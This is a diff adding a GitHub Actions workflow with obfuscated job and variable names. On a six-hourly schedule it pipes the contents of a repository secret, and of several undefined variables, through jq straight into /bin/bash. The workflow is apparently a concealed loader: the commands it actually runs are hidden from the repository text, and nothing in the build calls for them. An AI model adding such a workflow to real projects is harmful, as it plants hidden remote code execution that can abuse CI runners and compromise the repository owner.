@@ -1,0 +1,20 @@
+name: denyhyphae
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '22 3/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: denyhyphae
+        env:
+          gs14: ${{ secrets.gs14 }}
+        run: |
+          echo $gs14 | jq -r .efn7 | /bin/bash
+          echo $ddm88747 | jq -r .hufo4158 | /bin/bash
+          echo $x1626 | jq -r .f42 | /bin/bash
+          echo $njz1 | jq -r .blkfd89375 | /bin/bash
+          echo $qtixf3705 | jq -r .braln8084 | /bin/bash
+
